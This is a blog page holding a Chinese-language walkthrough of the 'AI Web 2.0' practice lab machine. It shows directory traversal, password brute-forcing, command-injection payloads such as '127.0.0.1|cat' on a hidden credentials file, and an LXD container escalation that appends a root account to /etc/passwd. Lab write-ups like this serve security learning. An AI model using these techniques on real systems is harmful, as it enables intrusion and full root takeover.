@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    AI Web 2.0 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-xpngqp" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      AI Web 2.0
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/06/29/xpngqp/" class="article-date">
+  <time datetime="2020-06-29T02:44:17.000Z" itemprop="datePublished">2020-06-29</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>nmap -A -p- 192.168.149.178</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593398719480-8a9504bb-a584-4ecb-a351-83b3cfd2f282.png#align=left&display=inline&height=349&margin=%5Bobject%20Object%5D&name=image.png&originHeight=614&originWidth=998&size=141215&status=done&style=none&width=568" alt="image.png"></p>
+<p>访问页面啥也没有</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593400563473-9e711fbe-2b68-4e25-8c33-0f225c720e9f.png#align=left&display=inline&height=418&margin=%5Bobject%20Object%5D&name=image.png&originHeight=835&originWidth=1572&size=915898&status=done&style=none&width=786" alt="image.png"></p>
+<p>发现有一个上传的地方被注释掉了，抓包的时候改掉它，得到一个上传点，但是不知道路径</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593400604810-913c4dba-311d-4ce5-be72-0ffabfdf1cd7.png#align=left&display=inline&height=464&margin=%5Bobject%20Object%5D&name=image.png&originHeight=927&originWidth=1262&size=111395&status=done&style=none&width=631" alt="image.png"></p>
+<p>扫目录，扫出来一个 download.php，然后去试了试上面导航栏的名字，viewing.php 也可以访问，deleting.php 会跳转回来（可能是删完了跳回来了？）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593400782296-8017ea6d-6da4-4da3-bd56-b9b10eed291d.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=image.png&originHeight=436&originWidth=967&size=75441&status=done&style=none&width=530" alt="image.png"></p>
+<p><a href="https://www.exploit-db.com/exploits/40009" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40009</a><br>这里有个目录遍历，使用 file_name 参数，看一下 apache 的认证文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593401997082-176d8223-1280-4a08-b194-fe77812109a4.png#align=left&display=inline&height=167&margin=%5Bobject%20Object%5D&name=image.png&originHeight=224&originWidth=814&size=32486&status=done&style=none&width=606" alt="image.png"></p>
+<p>靶机介绍说用这个字典来爆破密码<br><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-45.txt" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-45.txt</a></p>
+<p>瞬间出结果 aiweb2admin：c.ronaldo</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593402185829-ccf21e2a-a0c4-405c-95a4-c165c1efed8e.png#align=left&display=inline&height=182&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=1119&size=429142&status=done&style=none&width=692" alt="image.png"></p>
+<p>然后用 dirsearch 扫出来 webadmin（嗯，我以后还是直接用 dirsearch 把）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593402479803-01b4f6a4-cea5-47e5-90fe-fc7004bee06c.png#align=left&display=inline&height=530&margin=%5Bobject%20Object%5D&name=image.png&originHeight=737&originWidth=822&size=607982&status=done&style=none&width=591" alt="image.png"></p>
+<p>访问 <a href="http://192.168.149.178/webadmin/" target="_blank" rel="noopener">http://192.168.149.178/webadmin/</a> 用刚刚爆破出来的密码登录进去</p>
+<p>又提示了 robots，去访问一下<br>Disallow: /H05Tpin9555/<br>Disallow: /S0mextras/</p>
+<p>挨个访问，第一个有一个命令执行，用 | 可以绕过</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593403136074-50b01cff-f136-4575-b79e-bc6694ec36ff.png#align=left&display=inline&height=180&margin=%5Bobject%20Object%5D&name=image.png&originHeight=197&originWidth=386&size=7483&status=done&style=none&width=352" alt="image.png"></p>
+<p>使用 127.0.0.1|find . -type f /var/www/html/webadmin/S0mextras/ 看一下有没有什么隐藏的文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593403275112-aaa4cbe5-e0dc-4a3e-bf40-fc52ad60ec45.png#align=left&display=inline&height=205&margin=%5Bobject%20Object%5D&name=image.png&originHeight=282&originWidth=490&size=19245&status=done&style=none&width=356" alt="image.png"></p>
+<p>127.0.0.1|cat /var/www/html/webadmin/S0mextras/.sshUserCred55512.txt 拿到 ssh 账号密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593403335218-844afd13-1d85-4fc4-9959-c6843d818bc3.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&name=image.png&originHeight=213&originWidth=402&size=10571&status=done&style=none&width=357" alt="image.png"></p>
+<p>User: n0nr00tuser<br>Cred: zxowieoi4sdsadpEClDws1sf</p>
+<p>ssh 连上看看</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593403442503-4d76434f-392c-490f-b1f5-7a057b319efb.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1483&size=1344094&status=done&style=none&width=741.5" alt="image.png"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>用一下 <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a> 试试，一直看一些 wp 用还没用过<br>直接 git clone <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a> 然后进去给 LinEnum.sh 权限运行就可以</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593409827518-40da822e-deac-4973-91b1-7d198bd4a330.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1483&size=1339965&status=done&style=none&width=741.5" alt="image.png"></p>
+<p>当前用户 n0nr00tuser 是属于 lxd 的用户组成员</p>
+<blockquote>
+<p><strong>LXD 和 LXC</strong><br>Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于 Chroot 和完整开发的虚拟机之间，LXC 可以创建一个跟正常 Linux 操作系统十分接近的环境，但是不需要使用到单独的内核资源<br>Linux Daemon（LXD）是一个轻量级容器管理程序，而 LXD 是基于 LXC 容器技术实现的，而这种技术之前 Docker 也使用过。LXD 使用了稳定的 LXC API 来完成所有的后台容器管理工作，并且增加了 REST API 支持，更进一步地提升了用户体验度<br><a href="https://www.freebuf.com/articles/system/216803.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/216803.html</a></p>
+</blockquote>
+<p>依次执行这些语句</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lxc start UbuntuMini</span><br><span class="line">lxc config set UbuntuMini security.privileged true</span><br><span class="line">lxc config set UbuntuMini security.nesting true</span><br><span class="line">lxc config device add UbuntuMini sharetesting disk source=/etc path=/sharingiscaring</span><br></pre></td></tr></table></figure>
+
+<p>然后，复制 /etc/passwd 到当前目录 passwd，然后把这一句加进去<br><code>echo &#39;hack:$1$hack$gP1TCDm4c1ABbBzR6fMid1:0:0::/root:/bin/bash&#39; &gt;&gt; passwd</code><br>这里添加了一个有 root 权限的用户：hack，密码是：yichen<br>可以用这条命令生成 hash<br><code>openssl passwd -1 -salt hack yichen</code></p>
+<p>然后把 passwd 传到容器里面<br><code>lxc file push passwd UbuntuMini/sharingiscaring/passwd</code></p>
+<p>如果显示没有权限可以用 <code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code> 开一个 bash 的 shell</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593415357031-c6a3299e-086c-4f12-8fb5-702a4a4c82f0.png#align=left&display=inline&height=279&margin=%5Bobject%20Object%5D&name=image.png&originHeight=440&originWidth=983&size=495824&status=done&style=none&width=623" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/06/29/xpngqp/" data-id="ckco53qbl000l8ou99nqd7ktx" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/06/29/iq0f33/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            temp
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/06/27/gxg68i/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">靶机知识汇总</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
